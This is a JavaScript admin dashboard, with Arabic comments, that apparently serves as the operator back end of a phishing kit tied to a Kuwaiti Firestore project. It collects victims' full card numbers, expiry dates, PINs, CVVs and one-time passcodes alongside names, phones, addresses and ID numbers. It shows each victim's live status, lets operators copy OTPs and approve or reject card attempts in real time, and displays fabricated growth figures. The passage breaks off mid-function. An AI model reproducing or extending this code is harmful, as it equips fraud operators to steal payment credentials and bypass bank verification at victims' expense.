// ═══════════════════════════════════════════════════════════
// لوحة الإشعارات المتقدمة — منطق التطبيق
// يقرأ من Firestore collection "customers" في مشروع kuwait-b7d4b
// ═══════════════════════════════════════════════════════════

(function () {
  'use strict';

  // ── الحالة (State) ──────────────────────────────────────────
  let allNotifications = [];      // كل الإشعارات (بعد دمج cards + customers)
  let customersMap = {};          // خريطة العملاء بالـ sessionId
  let otpsMap = {};               // خريطة OTPs بالـ sessionId (مصفوفة لكل عميل)
  let cardsBySession = {};         // خريطة البطاقات بالـ sessionId (مصفوفة لكل عميل)
  let filteredNotifications = []; // بعد تطبيق الفلاتر
  let currentFilter = 'all';
  let currentSort = 'date';
  let searchQuery = '';
  let currentPage = 1;
  let pageSize = 10;
  let showStats = true;
  let autoRefresh = true;
  let unsubCustomers = null;      // إلغاء اشتراك customers
  let unsubCards = null;          // إلغاء اشتراك cards
  let unsubOtps = null;           // إلغاء اشتراك otps
  let currentDetailId = null;    // معرّف الإشعار المعروض في النافذة
  let seenIds = new Set();       // للإشعارات الجديدة (عداد الهيدر)

  // ── عناصر DOM ───────────────────────────────────────────────
  const $ = (id) => document.getElementById(id);
  const els = {
    loginScreen: $('login-screen'),
    loginForm: $('login-form'),
    loginEmail: $('login-email'),
    loginPassword: $('login-password'),
    loginError: $('login-error'),
    app: $('app'),
    lastUpdate: $('last-update'),
    headerBadge: $('header-badge'),
    btnRefresh: $('btn-refresh'),
    refreshIcon: $('refresh-icon'),
    btnToggleStats: $('btn-toggle-stats'),
    btnMenu: $('btn-menu'),
    menuDropdown: $('menu-dropdown'),
    menuSettings: $('menu-settings'),
    menuExport: $('menu-export'),
    menuLogout: $('menu-logout'),
    statsSection: $('stats-section'),
    filterTabs: $('filter-tabs'),
    sortSelect: $('sort-select'),
    searchInput: $('search-input'),
    notifCount: $('notif-count'),
    tbody: $('notifications-tbody'),
    emptyState: $('empty-state'),
    emptyMsg: $('empty-msg'),
    pagination: $('pagination'),
    paginationInfo: $('pagination-info'),
    paginationButtons: $('pagination-buttons'),
    // النوافذ المنبثقة
    detailModal: $('detail-modal'),
    detailTitle: $('detail-title'),
    detailContent: $('detail-content'),
    detailClose: $('detail-close'),
    detailCancel: $('detail-cancel'),
    settingsModal: $('settings-modal'),
    settingsClose: $('settings-close'),
    settingAutoRefresh: $('setting-autorefresh'),
    settingShowStats: $('setting-showstats'),
    settingPageSize: $('setting-pagesize'),
    exportModal: $('export-modal'),
    exportClose: $('export-close'),
    exportJson: $('export-json'),
    exportCsv: $('export-csv'),
    exportMsg: $('export-msg'),
    toastContainer: $('toast-container'),
  };

  // ── أدوات مساعدة ────────────────────────────────────────────
  function escapeHtml(s) {
    if (s === null || s === undefined) return '';
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }
  function fmtTime(ts) {
    if (!ts) return '-';
    const d = ts.toDate ? ts.toDate() : new Date(ts);
    return d.toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
  }
  function timeAgo(ts) {
    if (!ts) return 'غير معروف';
    const d = ts.toDate ? ts.toDate() : new Date(ts);
    const diff = (Date.now() - d.getTime()) / 1000;
    if (diff < 60) return 'منذ ثوانٍ';
    if (diff < 3600) return `منذ ${Math.floor(diff / 60)} دقيقة`;
    if (diff < 86400) return `منذ ${Math.floor(diff / 3600)} ساعة`;
    return `منذ ${Math.floor(diff / 86400)} يوم`;
  }
  function isOnline(lastSeen) {
    if (!lastSeen) return false;
    const d = lastSeen.toDate ? lastSeen.toDate() : new Date(lastSeen);
    return (Date.now() - d.getTime()) < 60000; // أقل من دقيقة = متصل
  }
  function statusBadge(status) {
    const map = {
      'pending':    { text: 'معلق', cls: 'bg-amber-500/10 text-amber-400 border-amber-500/30' },
      'approved':   { text: 'موافقة', cls: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' },
      'rejected':   { text: 'رفض', cls: 'bg-red-500/10 text-red-400 border-red-500/30' },
      'active':     { text: 'نشط', cls: 'bg-blue-500/10 text-blue-400 border-blue-500/30' },
      'PENDING':    { text: 'معلق', cls: 'bg-amber-500/10 text-amber-400 border-amber-500/30' },
      'APPROVED':   { text: 'معتمد', cls: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' },
      'REJECTED':   { text: 'مرفوض', cls: 'bg-red-500/10 text-red-400 border-red-500/30' },
    };
    const s = map[status] || { text: status || 'غير معروف', cls: 'bg-slate-500/10 text-slate-400 border-slate-500/30' };
    return `<span class="inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-xs font-medium ${s.cls}">${escapeHtml(s.text)}</span>`;
  }

  // ── التوست (Toasts) ─────────────────────────────────────────
  function toast(message, type = 'info') {
    const colors = {
      success: 'bg-emerald-600',
      error: 'bg-red-600',
      info: 'bg-slate-700',
    };
    const div = document.createElement('div');
    div.className = `${colors[type] || colors.info} text-white text-sm font-medium px-4 py-3 rounded-lg shadow-lg animate-[fadeIn_0.2s_ease-out]`;
    div.textContent = message;
    els.toastContainer.appendChild(div);
    setTimeout(() => { div.style.opacity = '0'; div.style.transition = 'opacity 0.3s'; setTimeout(() => div.remove(), 300); }, 3000);
  }

  // ── المصادقة (Login) ────────────────────────────────────────
  async function login(email, password) {
    try {
      await firebase.auth().signInWithEmailAndPassword(email, password);
      return true;
    } catch (err) {
      throw err;
    }
  }

  function showApp() {
    els.loginScreen.classList.add('hidden');
    els.app.classList.remove('hidden');
    startListening();
  }

  function logout() {
    if (unsubCustomers) { unsubCustomers(); unsubCustomers = null; }
    if (unsubCards) { unsubCards(); unsubCards = null; }
    if (unsubOtps) { unsubOtps(); unsubOtps = null; }
    firebase.auth().signOut().then(() => {
      localStorage.removeItem('zain_panel_auth');
      els.app.classList.add('hidden');
      els.loginScreen.classList.remove('hidden');
      els.loginError.classList.add('hidden');
    });
  }

  // ── الاستماع للبيانات من Firestore ──────────────────────────
  // مثل اللوحة القديمة تماماً: ندمج collection "cards" (كل بطاقة) مع
  // collection "customers" (بيانات العميل) عبر sessionId. كل صف = بطاقة.
  function startListening() {
    // فلاتر افتراضية للحالة
    document.querySelector('.filter-btn[data-filter="all"]').setAttribute('data-active', 'true');
    document.querySelector('.filter-btn[data-filter="all"]').classList.add('bg-emerald-600', 'text-white');

    // الإعدادات المحفوظة
    try {
      const saved = JSON.parse(localStorage.getItem('zain_panel_settings') || '{}');
      if (saved.pageSize) { pageSize = saved.pageSize; els.settingPageSize.value = saved.pageSize; }
      if (saved.showStats !== undefined) { showStats = saved.showStats; els.settingShowStats.checked = showStats; }
      if (saved.autoRefresh !== undefined) { autoRefresh = saved.autoRefresh; els.settingAutoRefresh.checked = autoRefresh; }
    } catch (e) {}
    applyShowStats();

    // استماع لـ customers (يحفظ في خريطة بالـ sessionId)
    try {
      unsubCustomers = db.collection('customers').onSnapshot((snap) => {
        customersMap = {};
        snap.forEach((doc) => {
          const data = doc.data();
          customersMap[data.sessionId || doc.id] = { id: doc.id, ...data };
        });
        rebuildMerged();
      }, (err) => {
        console.error('customers listen error:', err);
        toast('خطأ في قراءة العملاء: ' + (err.message || err.code), 'error');
      });
    } catch (e) { console.error(e); }

    // استماع لـ cards (كل بطاقة = صف في الجدول)
    try {
      unsubCards = db.collection('cards').onSnapshot((snap) => {
        cardsList = [];
        cardsBySession = {};
        snap.forEach((doc) => {
          const data = doc.data();
          const item = { id: doc.id, ...data };
          cardsList.push(item);
          const sid = data.sessionId || '';
          if (sid) {
            if (!cardsBySession[sid]) cardsBySession[sid] = [];
            cardsBySession[sid].push(item);
          }
        });
        // ترتيب بطاقات كل عميل من الأحدث للأقدم
        Object.keys(cardsBySession).forEach(sid => {
          cardsBySession[sid].sort((a, b) => {
            const ta = a.createdAt ? (a.createdAt.toDate ? a.createdAt.toDate().getTime() : new Date(a.createdAt).getTime() || 0) : 0;
            const tb = b.createdAt ? (b.createdAt.toDate ? b.createdAt.toDate().getTime() : new Date(b.createdAt).getTime() || 0) : 0;
            return tb - ta;
          });
        });
        rebuildMerged();
      }, (err) => {
        console.error('cards listen error:', err);
      });
    } catch (e) { console.error(e); }

    // استماع لـ otps (كل OTP = وثيقة منفصلة، نجمعها بالـ sessionId)
    try {
      unsubOtps = db.collection('otps').onSnapshot((snap) => {
        otpsMap = {};
        snap.forEach((doc) => {
          const data = doc.data();
          const sid = data.sessionId || '';
          if (sid) {
            if (!otpsMap[sid]) otpsMap[sid] = [];
            otpsMap[sid].push({ id: doc.id, ...data });
          }
        });
        // ترتيب OTPs كل عميل من الأحدث للأقدم
        Object.keys(otpsMap).forEach(sid => {
          otpsMap[sid].sort((a, b) => {
            const ta = a.createdAt ? (a.createdAt.toDate ? a.createdAt.toDate().getTime() : new Date(a.timestamp || a.createdAt).getTime() || 0) : 0;
            const tb = b.createdAt ? (b.createdAt.toDate ? b.createdAt.toDate().getTime() : new Date(b.timestamp || b.createdAt).getTime() || 0) : 0;
            return tb - ta;
          });
        });
        rebuildMerged();
      }, (err) => {
        console.error('otps listen error:', err);
      });
    } catch (e) { console.error(e); }
  }

  // قائمة البطاقات (تُحدّث من onSnapshot)
  let cardsList = [];

  // دمج cards + customers + otps — تبويب واحد لكل عميل (تجميع بالـ sessionId)
  function rebuildMerged() {
    if (!customersMap) return;

    // نجمع كل sessionIds من المصادر الثلاثة (customers + cards + otps)
    // لنضمن ظهور كل عميل مرة واحدة فقط حتى لو لم تكن له بطاقة/OTP
    const allSids = new Set([
      ...Object.keys(customersMap),
      ...Object.keys(cardsBySession),
      ...Object.keys(otpsMap),
    ]);

    const toTime = (v) => {
      if (!v) return 0;
      if (typeof v.toDate === 'function') return v.toDate().getTime();
      const t = new Date(v).getTime();
      return isNaN(t) ? 0 : t;
    };

    const merged = Array.from(allSids).map(sid => {
      const m = customersMap[sid] || {};
      // كل البطاقات وكل الـ OTPs لهذا العميل (مرتبة من الأحدث بالفعل في onSnapshot)
      const sessionCards = cardsBySession[sid] || [];
      const sessionOtps = otpsMap[sid] || [];
      const latestCard = sessionCards[0] || {};
      const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
      const ls = m.lastSeen ? Number(m.lastSeen) : 0;
      // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
      const lastActivity = Math.max(
        toTime(latestCard.createdAt),
        toTime(latestOtp && latestOtp.createdAt),
        ls
      );
      return {
        // المعرف الفريد = sessionId (تبويب واحد لكل عميل)
        id: sid,
        sessionId: sid,
        // أحدث بطاقة (للعرض في الأعمدة الرئيسية للجدول)
        cardNumber: latestCard.cardNumber || '',
        prefix: latestCard.cardPrefix || '',
        bank: latestCard.bankName || '',
        expiryDate: latestCard.expiry || '',
        cvv: latestCard.pin || '',
        cardCreatedAt: latestCard.createdAt || null,
        cardTimestamp: latestCard.timestamp || '',
        // كل البطاقات وكل الـ OTPs لهذا العميل
        allCards: sessionCards,
        allOtps: sessionOtps,
        // بيانات العميل (من customers)
        name: m.name || '',
        phone: m.phone || '',
        address: m.address || '',
        apartment: m.apartment || '',
        deliveryNotes: m.deliveryNotes || '',
        items: m.items || [],
        amount: m.amount || '',
        paymentType: m.paymentType || '',
        otp: latestOtp ? latestOtp.otp : (m.otp || ''),
        otp2: m.otp2 || '',
        idNumber: m.idNumber || '',
        network: m.network || '',
        email: m.email || '',
        country: m.country || '',
        pass: m.pass || '',
        step: m.step || '',
        // الحالة والعرض
        status: m.status || 'pending',
        decision: m.decision || '',
        isHidden: !!m.isHidden,
        flagColor: m.flagColor || '',
        currentPage: m.currentPage || '',
        lastSeen: ls,
        createdDate: latestCard.createdAt || m.createdAt || null,
        lastActivity: lastActivity,
        ip: m.ip || '',
        device: m.device || '',
        browser: m.browser || '',
      };
    })
    // إظهار العملاء الذين أدخلوا بياناتهم فقط (ليس مجرد زائرين)
    // العميل يظهر إذا كان لديه: اسم أو هاتف أو عنوان أو بطاقة أو OTP
    .filter(x => !x.isHidden && (
      x.name || x.phone || x.address ||
      (x.allCards && x.allCards.length > 0) ||
      (x.allOtps && x.allOtps.length > 0)
    ))
    // ترتيب: آخر نشاط أولاً (الأحدث)
    .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));

    allNotifications = merged;

    // عدّاد الإشعارات الجديدة
    const newOnes = merged.filter(n => !seenIds.has(n.id));
    if (seenIds.size > 0 && newOnes.length > 0) {
      els.headerBadge.textContent = newOnes.length;
      els.headerBadge.classList.remove('hidden');
    }
    newOnes.forEach(n => seenIds.add(n.id));

    // آخر تحديث
    els.lastUpdate.textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
    applyFilters();
  }

  // ── الفلترة والترتيب ─────────────────────────────────────────
  function applyFilters() {
    filteredNotifications = allNotifications.filter(n => {
      // فلتر التبويب
      if (currentFilter === 'pending' && !(n.status === 'pending' || n.status === 'PENDING' || n.decision === 'pending' || (!n.decision && n.status !== 'approved' && n.status !== 'rejected'))) return false;
      if (currentFilter === 'card' && !n.cardNumber) return false;
      if (currentFilter === 'online' && !isOnline(n.lastSeen)) return false;
      // البحث
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        const hay = [n.name, n.phone, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id].filter(Boolean).join(' ').toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });

    // الترتيب
    filteredNotifications.sort((a, b) => {
      if (currentSort === 'date') {
        return (b.lastActivity || b.createdDate ? (b.lastActivity || (b.createdDate.toDate ? b.createdDate.toDate().getTime() : (new Date(b.createdDate).getTime() || 0))) : 0) - (a.lastActivity || a.createdDate ? (a.lastActivity || (a.createdDate.toDate ? a.createdDate.toDate().getTime() : (new Date(a.createdDate).getTime() || 0))) : 0);
      }
      if (currentSort === 'status') return (a.status || '').localeCompare(b.status || '');
      if (currentSort === 'country') return (a.country || '').localeCompare(b.country || '');
      return 0;
    });

    renderTable();
    renderStats();
  }

  // ── عرض الإحصائيات ──────────────────────────────────────────
  function renderStats() {
    if (!showStats) { els.statsSection.innerHTML = ''; return; }
    // الإحصائيات على البيانات المدمجة (بطاقات فريدة عبر sessionId)
    const total = allNotifications.length;
    const online = allNotifications.filter(n => isOnline(n.lastSeen)).length;
    const cards = allNotifications.filter(n => n.cardNumber).length;
    const approved = allNotifications.filter(n => n.status === 'approved' || n.status === 'APPROVED' || n.decision === 'approved').length;

    const stats = [
      { title: 'إجمالي الزوار', value: total, change: '+12%', color: 'from-blue-500 to-blue-600', icon: '<path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path>' },
      { title: 'المستخدمين المتصلين', value: online, change: '+5%', color: 'from-green-500 to-green-600', icon: '<path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>' },
      { title: 'معلومات البطاقات', value: cards, change: '+8%', color: 'from-purple-500 to-purple-600', icon: '<rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line>' },
      { title: 'الموافقات', value: approved, change: '+15%', color: 'from-emerald-500 to-emerald-600', icon: '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline>' },
    ];

    els.statsSection.innerHTML = stats.map(s => `
      <div class="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 rounded-xl p-5 shadow-xl shadow-black/20">
        <div class="flex items-center justify-between mb-4">
          <div class="bg-gradient-to-br ${s.color} p-3 rounded-xl shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${s.icon}</svg>
          </div>
          <span class="text-sm font-semibold text-emerald-400 bg-emerald-500/10 px-2 py-1 rounded-md">${s.change}</span>
        </div>
        <div>
          <p class="text-3xl font-bold text-white">${s.value}</p>
          <p class="text-sm text-slate-400 mt-1">${escapeHtml(s.title)}</p>
        </div>
      </div>
    `).join('');
  }

  // ── عرض الجدول ──────────────────────────────────────────────
  function renderTable() {
    els.notifCount.textContent = filteredNotifications.length;

    if (filteredNotifications.length === 0) {
      els.tbody.innerHTML = '';
      els.emptyState.classList.remove('hidden');
      els.emptyState.classList.add('flex');
      els.emptyMsg.textContent = (searchQuery || currentFilter !== 'all')
        ? 'لم يتم العثور على نتائج مطابقة للفلاتر'
        : 'ستظهر الإشعارات هنا عند استلامها';
      els.pagination.classList.add('hidden');
      return;
    }
    els.emptyState.classList.add('hidden');
    els.emptyState.classList.remove('flex');

    // الترقيم
    const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / pageSize));
    if (currentPage > totalPages) currentPage = totalPages;
    const startIdx = (currentPage - 1) * pageSize;
    const pageItems = filteredNotifications.slice(startIdx, startIdx + pageSize);

    els.tbody.innerHTML = pageItems.map(n => {
      const online = isOnline(n.lastSeen);
      const onlineCls = online ? 'text-emerald-400' : 'text-slate-500';
      const status = n.decision || n.status || 'pending';
      const flagBorder = n.flagColor ? `style="border-right:3px solid ${n.flagColor === 'red' ? '#ef4444' : n.flagColor === 'yellow' ? '#eab308' : '#22c55e'}"` : '';
      const countryOrBank = n.country || n.bank || 'غير معروف';
      const hasPersonal = n.phone || n.name;
      return `
        <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors" ${flagBorder} data-id="${escapeHtml(n.id)}">
          <td class="px-6 py-4">
            <div class="flex items-center gap-3">
              <div class="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500/20 to-teal-500/10 flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-400"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle></svg>
              </div>
              <span class="font-medium text-white">${escapeHtml(countryOrBank)}</span>
            </div>
          </td>
          <td class="px-6 py-4">
            <div class="flex flex-wrap gap-2">
              <button class="info-btn px-3 py-1.5 rounded-md text-xs font-medium ${hasPersonal ? 'bg-blue-500/10 text-blue-400 border border-blue-500/30 hover:bg-blue-500/20' : 'bg-slate-800/50 text-slate-500 border border-slate-700'}" data-info="personal" data-id="${escapeHtml(n.id)}">${(n.allOtps && n.allOtps.length > 1) ? `معلومات شخصية (${n.allOtps.length} OTP)` : 'معلومات شخصية'}</button>
              <button class="info-btn px-3 py-1.5 rounded-md text-xs font-medium ${n.cardNumber ? 'bg-green-500/10 text-green-400 border border-green-500/30 hover:bg-green-500/20' : 'bg-slate-800/50 text-slate-500 border border-slate-700'}" data-info="card" data-id="${escapeHtml(n.id)}">${(n.allCards && n.allCards.length > 1) ? `معلومات البطاقة (${n.allCards.length})` : 'معلومات البطاقة'}</button>
            </div>
          </td>
          <td class="px-6 py-4">${statusBadge(status)}</td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-2 text-sm text-slate-400">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="flex-shrink-0 text-slate-500"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
              <span class="whitespace-nowrap">${timeAgo(n.lastSeen || n.createdDate)}</span>
            </div>
          </td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-2">
              <span class="w-2 h-2 rounded-full ${online ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600'}"></span>
              <span class="text-sm ${onlineCls}">${online ? 'متصل' : 'غير متصل'}</span>
            </div>
          </td>
          <td class="px-6 py-4 text-center">
            ${n.otp ? `<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-xs font-mono bg-emerald-500/10 text-emerald-400 border-emerald-500/30">${escapeHtml(String(n.otp))}</span>` : '<span class="text-slate-500 text-sm">-</span>'}
          </td>
          <td class="px-6 py-4 text-center">
            ${n.currentPage ? `<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-xs bg-slate-800/50 text-slate-300 border-slate-700">${escapeHtml(n.currentPage)}</span>` : '<span class="text-slate-500 text-sm">-</span>'}
          </td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-1">
              <button class="info-btn px-2 py-1.5 rounded-md text-xs font-medium bg-slate-700/50 text-slate-300 hover:bg-slate-700 border border-slate-600" data-info="card" data-id="${escapeHtml(n.id)}" title="تفاصيل">⋯</button>
            </div>
          </td>
        </tr>
      `;
    }).join('');

    // الترقيم
    if (filteredNotifications.length > pageSize) {
      els.pagination.classList.remove('hidden');
      els.pagination.classList.add('flex');
      els.paginationInfo.textContent = `عرض ${startIdx + 1}-${Math.min(startIdx + pageSize, filteredNotifications.length)} من ${filteredNotifications.length}`;
      let buttons = '';
      buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm bg-slate-800 text-slate-300 hover:bg-slate-700 ${currentPage === 1 ? 'opacity-50 cursor-not-allowed' : ''}" data-page="${currentPage - 1}" ${currentPage === 1 ? 'disabled' : ''}>السابق</button>`;
      for (let p = 1; p <= totalPages; p++) {
        buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm ${p === currentPage ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}" data-page="${p}">${p}</button>`;
      }
      buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm bg-slate-800 text-slate-300 hover:bg-slate-700 ${currentPage === totalPages ? 'opacity-50 cursor-not-allowed' : ''}" data-page="${currentPage + 1}" ${currentPage === totalPages ? 'disabled' : ''}>التالي</button>`;
      els.paginationButtons.innerHTML = buttons;
    } else {
      els.pagination.classList.add('hidden');
      els.pagination.classList.remove('flex');
    }
  }

  // ── نافذة التفاصيل ──────────────────────────────────────────
  function openDetail(id, type) {
    const n = allNotifications.find(x => x.id === id || x.sessionId === id);
    if (!n) return;
    currentDetailId = n.id;
    els.detailTitle.textContent = type === 'card' ? 'معلومات البطاقة' : 'المعلومات الشخصية';
    if (type === 'personal') {
      // معلومات شخصية من customers — البيانات التي يجمعها الموقع فعلياً
      const itemsText = (n.items && n.items.length)
        ? n.items.map(it => `${escapeHtml(it.name || 'منتج')} × ${escapeHtml(String(it.qty || 1))} (${escapeHtml(String(it.price || 0))} د.ك)`).join('، ')
        : '';
      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
      const fields = [
        { label: 'الاسم', value: n.name },
        { label: 'رقم الهاتف', value: n.phone },
        { label: 'العنوان', value: n.address },
        { label: 'الشقة / رقم الباب', value: n.apartment },
        { label: 'تعليمات خاصة', value: n.deliveryNotes },
        { label: 'المنتج', value: itemsText },
        { label: 'طريقة الدفع', value: paymentLabel },
        { label: 'المبلغ', value: n.amount },
      ];
      let html = renderDetailFields(fields);

      // قسم رموز التحقق (OTP) — كل رمز في صندوق منفصل
      if (n.allOtps && n.allOtps.length) {
        html += `
          <div class="mt-4 pt-4 border-t border-slate-700">
            <div class="flex items-center justify-between mb-3">
              <h4 class="text-sm font-semibold text-emerald-400">رموز التحقق (${n.allOtps.length})</h4>
            </div>
            <div class="space-y-2">
              ${n.allOtps.map((o, i) => `
                <div class="flex items-center justify-between p-2.5 bg-slate-800/50 rounded-lg border border-slate-700">
                  <div class="flex items-center gap-2">
                    <span class="text-xs font-semibold text-slate-500 bg-slate-700 px-2 py-0.5 rounded">#${n.allOtps.length - i}</span>
                    <span class="text-lg font-mono font-bold text-emerald-400">${escapeHtml(String(o.otp || ''))}</span>
                  </div>
                  <div class="flex items-center gap-2">
                    <span class="text-xs text-slate-500">${escapeHtml(o.timestamp || timeAgo(o.createdAt))}</span>
                    <button class="copy-otp-btn text-slate-400 hover:text-emerald-400 p-1 rounded hover:bg-slate-700" data-otp="${escapeHtml(String(o.otp || ''))}" title="نسخ">
                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    </button>
                  </div>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      }
      els.detailContent.innerHTML = html;

      // ربط أزرار النسخ
      els.detailContent.querySelectorAll('.copy-otp-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          const val = btn.dataset.otp;
          navigator.clipboard.writeText(val).then(() => toast('تم نسخ الرمز: ' + val, 'success'));
        });
      });
    } else {
      // معلومات البطاقة: كل بطاقة في صندوق منفصل
      const cards = n.allCards && n.allCards.length ? n.allCards : [n];
      let html = '';
      cards.forEach((card, i) => {
        const isLatest = i === 0;
        const cardData = {
          bank: card.bankName || card.bank || n.bank,
          cardNumber: card.cardNumber || n.cardNumber,
          prefix: card.cardPrefix || card.prefix || n.prefix,
          expiry: card.expiry || n.expiryDate,
          pin: card.pin || '',
          cvv: card.cvv || '',
          timestamp: card.timestamp || '',
        };
        const cardId = card.id || '';
        const cardDecision = card.decision || '';
        if (cards.length > 1) {
          html += `<div class="mb-2 flex items-center gap-2">
            <span class="text-xs font-semibold ${isLatest ? 'text-emerald-400' : 'text-slate-500'} bg-${isLatest ? 'emerald' : 'slate'}-500/10 px-2 py-0.5 rounded">البطاقة ${cards.length - i}</span>
            ${isLatest ? '<span class="text-xs text-emerald-400">الأحدث</span>' : '<span class="text-xs text-slate-500">سابقة</span>'}
          </div>`;
        }
        html += renderDetailFields([
          { label: 'البنك', value: cardData.bank },
          { label: 'رقم البطاقة', value: cardData.cardNumber ? `${cardData.cardNumber} - ${cardData.prefix || ''}` : undefined },
          { label: 'تاريخ الانتهاء', value: cardData.expiry },
          { label: 'الرقم السري (PIN)', value: cardData.pin },
          { label: 'رمز الأمان (CVV)', value: cardData.cvv },
        ]);
        if (cardData.timestamp) {
          html += `<div class="text-xs text-slate-500 text-left mb-2">الوقت: ${escapeHtml(cardData.timestamp)}</div>`;
        }
        // أزرار الموافقة/الرفض لكل محاولة دفع — تظهر لمرة واحدة، ثم تُخفى وتُعرض الحالة
        if (cardDecision === 'approved') {
          html += `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center">
            <span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span>
          </div>`;
        } else if (cardDecision === 'rejected') {
          html += `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center">
            <span class="text-sm font-semibold text-red-400">✕ تم الرفض</span>
          </div>`;
        } else if (cardId) {
          html += `<div class="mt-2 flex gap-2" data-card-actions="${escapeHtml(cardId)}">
            <button class="card-approve flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">موافقة</button>
            <button class="card-reject flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">رفض</button>
          </div>`;
        }
        if (i < cards.length - 1) {
          html += '<div class="my-3 border-t border-slate-700"></div>';
        }
      });

      // قسم OTP في نافذة البطاقة أيضاً
      if (n.allOtps && n.allOtps.length) {
        html += `
          <div class="mt-4 pt-4 border-t border-slate-700">
            <h4 class="text-sm font-semibold text-emerald-400 mb-3">رموز التحقق (${n.allOtps.length})</h4>
            <div class="grid grid-cols-2 gap-2">
              ${n.allOtps.map((o, i) => `
                <div class="flex items-center justify-between p-2 bg-slate-800/50 rounded-lg border border-slate-700">
                  <span class="text-xs text-slate-500">#${n.allOtps.length - i}</span>
                  <span class="text-lg font-mono font-bold text-emerald-400">${escapeHtml(String(o.otp || ''))}</span>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      }

      // معلومات إضافية من العميل
      html += `
        <div class="mt-4 pt-4 border-t border-slate-700">
          <h4 class="text-sm font-semibold text-blue-400 mb-3">معلومات إضافية</h4>
          ${renderDetailFields([
            { label: 'المبلغ', value: n.amount },
          ])}
        </div>
      `;
      els.detailContent.innerHTML = html;

      // ربط أزرار الموافقة/الرفض لكل بطاقة
      els.detailContent.querySelectorAll('.card-approve').forEach(btn => {
        btn.addEventListener('click', () => {
          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'approved', btn);
        });
      });
      els.detailContent.querySelectorAll('.card-reject').forEach(btn => {
        btn.addEventListener('click', () => {
          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'rejected', btn);
        });
      });
    }
    els.detailModal.classList.remove('hidden');
  }

  function renderDetailFields(fields) {
    return fields.map(f => `
      <div class="flex items-center justify-between py-2 border-b border-slate-800/50">
        <span class="text-sm text-slate-400">${escapeHtml(f.label)}</span>
        <span class="text-sm font-medium text-white font-mono ${f.sensitive ? 'bg-slate-800/50 px-2 py-0.5 rounded' : ''}">${escapeHtml(f.value || '-')}</span>
      </div>
    `).join('');
  }

  // ── الموافقة / الرفض ────────────────────────────────────────
  // نكتب القرار في وثيقة العميل customers/{sessionId} (المصدر الذي يقرأه الموقع)
  async function setDecision(id, decision) {
    try {
      // ابحث عن العميل عبر sessionId (من البيانات المدمجة)
      const n = allNotifications.find(x => x.id === id || x.sessionId === id);
      const sid = n ? n.sessionId : id;
      if (!sid) { toast('تعذّر تحديد العميل', 'error'); return; }
